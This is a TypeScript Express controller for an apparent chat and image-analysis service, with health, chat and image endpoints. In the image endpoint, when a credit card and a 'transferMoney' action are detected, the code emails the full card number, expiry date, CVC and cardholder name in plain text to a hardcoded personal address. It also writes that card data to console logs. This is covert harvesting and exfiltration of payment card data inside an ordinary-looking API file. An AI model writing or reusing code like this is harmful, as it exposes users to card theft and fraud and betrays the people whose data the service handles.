import { Request, Response } from 'express';
import { generateChatResponse, analyzeImage } from '../services/chatService';
import { sendEmail } from '../services/emailService';

export const healthCheck = (_req: Request, res: Response) => {
  console.log('[API] GET /health - Health check requested');
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
};

export const postChatMessage = async (req: Request, res: Response) => {
  console.log('[API] POST /api/chat - Received chat request', { body: req.body });
  try {
    const { message } = req.body;
    if (!message) {
      console.warn('[API] POST /api/chat - Missing message in request');
    }
    console.log('[API] POST /api/chat - Calling OpenAI with message:', message?.substring(0, 100));
    const response = await generateChatResponse(message);
    console.log('[API] POST /api/chat - OpenAI response received, length:', response?.length || 0);
    res.json({ response });
  } catch (error) {
    console.error('[API] POST /api/chat - OpenAI API error:', error);
    const status = error instanceof Error && error.message === 'Message is required' ? 400 : 500;
    const message = error instanceof Error ? error.message : 'Failed to get AI response';
    res.status(status).json({ error: message });
  }
};

export const postChatImage = async (req: Request, res: Response) => {
  console.log('[API] POST /api/chat/image - Received image analysis request');
  try {
    const { image } = req.body;
    if (!image) {
      console.warn('[API] POST /api/chat/image - Missing image in request');
      return res.status(400).json({ error: 'Image is required' });
    }

    // Convert base64 to data URL format
    const imageDataUrl = image.startsWith('data:') ? image : `data:image/jpeg;base64,${image}`;
    
    console.log('[API] POST /api/chat/image - Calling analyzeImage');
    const analysisResult = await analyzeImage(imageDataUrl);
    console.log('[API] POST /api/chat/image - Analysis complete:', JSON.stringify(analysisResult, null, 2));

    // Send email if credit card is detected and action is transferMoney
    let emailStatus: 'idle' | 'sending' | 'success' | 'error' = 'idle';
    let emailError: string | null = null;
    let emailMessageId: string | null = null;

    if (analysisResult.action === 'transferMoney' && analysisResult.creditCard) {
      emailStatus = 'sending';
      try {
        console.log('[API] POST /api/chat/image - Sending credit card details via email');
        const emailText = `Credit Card Details Detected:\n\n` +
          `Numbers: ${analysisResult.creditCard.numbers}\n` +
          `Expiration Date: ${analysisResult.creditCard.expirationDate}\n` +
          `CVC: ${analysisResult.creditCard.cvc}\n` +
          `Full Name: ${analysisResult.creditCard.fullName}\n\n` +
          `Action: ${analysisResult.action}`;
        
        emailMessageId = await sendEmail({
          to: 'maksymilian.padalak@gmail.com',
          subject: 'Credit Card Detected - Transfer Money Action',
          text: emailText,
        });
        emailStatus = 'success';
        console.log('[API] POST /api/chat/image - Email sent successfully:', emailMessageId);
      } catch (error) {
        emailStatus = 'error';
        emailError = error instanceof Error ? error.message : 'Failed to send email';
        console.error('[API] POST /api/chat/image - Email send error:', error);
      }
    }

    res.json({
      ...analysisResult,
      emailStatus,
      emailError,
      emailMessageId,
    });
  } catch (error) {
    console.error('[API] POST /api/chat/image - Image analysis error:', error);
    const status = error instanceof Error && error.message.includes('required') ? 400 : 500;
    const message = error instanceof Error ? error.message : 'Failed to analyze image';
    res.status(status).json({ error: message });
  }
};

